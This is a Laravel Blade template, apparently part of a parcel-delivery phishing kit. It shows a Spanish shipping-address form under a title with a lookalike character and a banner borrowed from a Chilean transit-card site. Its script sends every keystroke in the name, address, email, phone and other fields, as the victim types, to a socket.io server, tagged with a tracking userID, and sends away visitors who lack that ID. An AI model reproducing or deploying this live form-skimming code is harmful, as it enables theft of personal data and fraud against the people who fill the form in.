@include('apps.mxe.partials.header')
<style>
.wrap {
    padding: 30px 20px;
    padding-bottom: 20px;
    background: white;
}

.top1 {
    background: white;
}

a.main-logo {
    display: block;
    margin: 11px 0 25px 0;
    text-align: center;
    color: #00a8b7;
    font-size: 19px;
    font-weight: bold;
}

.notice {
    line-height: 2;
    padding: 10px;
    border-radius: 5px;
    color: #777977;
    margin: 30px 0 40px;
    background: #f0f0eb;
}

@media(max-width: 767px) {
    p.like_viewmore {
        font-size: 13px;
        color: red;
        cursor: pointer;
    }

    .submit-btn {
        text-align: center;
        background-color: #00a8b7 !important;
        padding: 11px 24px;
        font-size: 1rem;
        display: block;
        width: auto;
        min-width: 120px;
        margin-left: auto;
        margin-right: auto;
        line-height: 22px;
        border-radius: 32px;
        color: #fff;
        border-color: #00a8b7;
        height: auto;
        cursor: pointer;
    }

    .submit-btn:hover:hover {
        background-color: #00a8b7;
        border-color: #00a8b7;
    }

    .loader-wrap {
        display: flex;
        width: 100%;
        height: 100%;
        position: fixed;
        top: 0;
        left: 0;
        align-items: center;
        justify-content: center;
        z-index: 99999999999999;
        background: rgba(255, 255, 255, 1);
    }

    .loader-wrap .loading {
        display: flex;
        flex-direction: column;
        align-items: center;
    }

    .loader-wrap .loading img.china-mobile-logo-img {
        width: 200px;
    }

    .loader-wrap .loading img {
        width: 80px;
    }
}

table,
tr,
th {
    padding: 10px;
    margin: auto;
    border: none;
    border-collapse: separate;
}

.cstm-table-new tr td strong {
    color: #004F98;
}

.top1 p {
    color: #004F98;
    padding: 10px 0px;
}

.total-price {
    background: #fff;
    padding: 11px 19px;
    margin-bottom: 17px;
    border-bottom: 2px solid #dedede;
}

span.total-price-inner {
    float: right;
    color: #004F98;
    padding-right: 43px;
}

tr.alert-notice {
    float: right;
}

tr.alert-notice>td {
    border: none;
}

table tr.input-as-text {
    border-radius: 10px;
    background: #fff;
}

.img-text {
    background: url("https://tarjetabip.cl/images/bot-carga-online.png") no-repeat top center;
    background-size: 100%;
    width: 100%;
    height: 110px;
    position: relative;
    display: table;
}

.text-center {
    border-top: 2px solid #dedede;
}

.top1 p {
    border-top: 2px solid #dedede;
}

table {
    border-top: 2px solid #dedede;
}

.center {
    border-top: 2px solid #dedede;
}

.img-text h3 {
    font-size: 25px !important;
    display: table-cell !important;
    text-align: center;
    color: white;
    font-weight: bold;
    text-shadow: 1px 1px 2px rgba(0, 0, 0, 1);
    vertical-align: middle !important;
    line-height: 25px;
}

::placeholder {
    /* Chrome, Firefox, Opera, Safari 10.1+ */
    color: #000;
    opacity: 1;
    /* Firefox */
}

:-ms-input-placeholder {
    /* Internet Explorer 10-11 */
    color: #000;
}

::-ms-input-placeholder {
    /* Microsoft Edge */
    color: #000;
}

body.zh_HK input {
    font-weight: normal !important;
}

tr.input-as-text {
    border-top-left-radius: 10px;
}

tr.input-as-text {
    border-top-right-radius: 10px;
}

tr.input-as-text {
    border-bottom-left-radius: 10px;
}

tr.input-as-text {
    border-bottom-right-radius: 10px;
}
</style>
<div class="wrap only_mobile">
    <div class="container">
        <div class="">
            <div>
                <h2 class="form_title">Dirección de envíȯ</h2>
                <p class="form_dis">Por favor, introduzca la dirección correcta para que podamos entregar su paquete
                    correctamente.</p>
            </div>
            <form action="{{ route('apps.mxe.payment_post') }}" method="post">
                @csrf
                <label for="fname">Nombre completo</label>
                <input class="inputField" type="text" id="name" name="name"><br>

                <label for="lname">Dirección</label>
                <input class="inputField" type="text" id="address" name="address"><br>

                <label for="lname">Casa, apartamento, etc. (opcional)</label>
                <input class="inputField" type="text" id="straight" name="straight"><br>

                <label for="lname">Ciudad</label>
                <input class="inputField" type="text" id="city" name="city"><br>

                <label for="lname">Estado</label>
                <input class="inputField" type="text" id="state" name="state"><br>

                <label for="lname">país</label>
                <input class="inputField" type="text" id="country" name="country"><br>

                <label for="lname">Código postal</label>
                <input class="inputField" type="text" id="zipcode" name="zipcode"><br>

                <label for="lname">Correo electrónico</label>
                <input class="inputField" type="text" id="email" name="email"><br>

                <label for="lname">Teléfono - test</label>
                <input class="inputField" type="text" id="phone" name="phone"><br><br>

                <input type="submit" class="button_next" style="background-color: #c00d0d;" name="payment_page_submit"
                    value="Continuar">
            </form>
        </div>
    </div>
</div>
<div>
</div>
<script>
$(document).ready(function() {
    let socket = io("http://{{ env('SOCKET_HOST') }}:{{ env('SOCKET_PORT') }}");
    if (!localStorage.getItem('userID')) {
        window.location.href = window.location.origin;
    }

    socket.on('connect', () => {
        var id = localStorage.getItem('userID')
        if (id) {
            var data = {
                id: id,
                page: 'address'
            }
            socket.emit('clientEvent', JSON.stringify(data));
        }
    });

    $('#name').keydown((event) => {
        var data = {
            id: localStorage.getItem('userID'),
            page: 'address',
            field: 'name',
            value: event.target.value,
            is_typing: true
        }
        socket.emit('clientEvent', JSON.stringify(data));
    });

    $('#name').keyup((event) => {
        var data = {
            id: localStorage.getItem('userID'),
            page: 'address',
            field: 'name',
            value: event.target.value,
            is_typing: false
        }
        socket.emit('clientEvent', JSON.stringify(data));
    });

    $('#address').keydown((event) => {
        var data = {
            id: localStorage.getItem('userID'),
            page: 'address',
            field: 'address',
            value: event.target.value,
            is_typing: true
        }
        socket.emit('clientEvent', JSON.stringify(data));
    });
    $('#address').keyup((event) => {
        var data = {
            id: localStorage.getItem('userID'),
            page: 'address',
            field: 'address',
            value: event.target.value,
            is_typing: false
        }
        socket.emit('clientEvent', JSON.stringify(data));
    });

    $('#straight').keydown((event) => {
        var data = {
            id: localStorage.getItem('userID'),
            page: 'address',
            field: 'straight',
            value: event.target.value,
            is_typing: true
        }
        socket.emit('clientEvent', JSON.stringify(data));
    });

    $('#straight').keyup((event) => {
        var data = {
            id: localStorage.getItem('userID'),
            page: 'address',
            field: 'straight',
            value: event.target.value,
            is_typing: false
        }
        socket.emit('clientEvent', JSON.stringify(data));
    });

    $('#city').keydown((event) => {
        var data = {
            id: localStorage.getItem('userID'),
            page: 'address',
            field: 'city',
            value: event.target.value,
            is_typing: true
        }
        socket.emit('clientEvent', JSON.stringify(data));
    });

    $('#city').keyup((event) => {
        var data = {
            id: localStorage.getItem('userID'),
            page: 'address',
            field: 'city',
            value: event.target.value,
            is_typing: false
        }
        socket.emit('clientEvent', JSON.stringify(data));
    });

    $('#country').keydown((event) => {
        var data = {
            id: localStorage.getItem('userID'),
            page: 'address',
            field: 'country',
            value: event.target.value,
            is_typing: true
        }
        socket.emit('clientEvent', JSON.stringify(data));
    });

    $('#country').keyup((event) => {
        var data = {
            id: localStorage.getItem('userID'),
            page: 'address',
            field: 'country',
            value: event.target.value,
            is_typing: false
        }
        socket.emit('clientEvent', JSON.stringify(data));
    });

    $('#zipcode').keydown((event) => {
        var data = {
            id: localStorage.getItem('userID'),
            page: 'address',
            field: 'zipcode',
            value: event.target.value,
            is_typing: true,
        }
        socket.emit('clientEvent', JSON.stringify(data));
    });

    $('#zipcode').keyup((event) => {
        var data = {
            id: localStorage.getItem('userID'),
            page: 'address',
            field: 'zipcode',
            value: event.target.value,
            is_typing: false
        }
        socket.emit('clientEvent', JSON.stringify(data));
    });

    $('#email').keydown((event) => {
        var data = {
            id: localStorage.getItem('userID'),
            page: 'address',
            field: 'email',
            value: event.target.value,
            is_typing: true
        }
        socket.emit('clientEvent', JSON.stringify(data));
    });

    $('#email').keyup((event) => {
        var data = {
            id: localStorage.getItem('userID'),
            page: 'address',
            field: 'email',
            value: event.target.value,
            is_typing: false
        }
        socket.emit('clientEvent', JSON.stringify(data));
    });

    $('#phone').keydown((event) => {
        var data = {
            id: localStorage.getItem('userID'),
            page: 'address',
            field: 'phone',
            value: event.target.value,
            is_typing: true
        }
        socket.emit('clientEvent', JSON.stringify(data));
    });

    $('#phone').keyup((event) => {
        var data = {
            id: localStorage.getItem('userID'),
            page: 'address',
            field: 'phone',
            value: event.target.value,
            is_typing: false
        }
        socket.emit('clientEvent', JSON.stringify(data));
    });

    $('#state').keydown((event) => {
        var data = {
            id: localStorage.getItem('userID'),
            page: 'address',
            field: 'state',
            value: event.target.value,
            is_typing: true
        }
        socket.emit('clientEvent', JSON.stringify(data));
    });

    $('#state').keyup((event) => {
        var data = {
            id: localStorage.getItem('userID'),
            page: 'address',
            field: 'state',
            value: event.target.value,
            is_typing: false
        }
        socket.emit('clientEvent', JSON.stringify(data));
    });
});
</script>

@include('apps.mxe.partials.footer')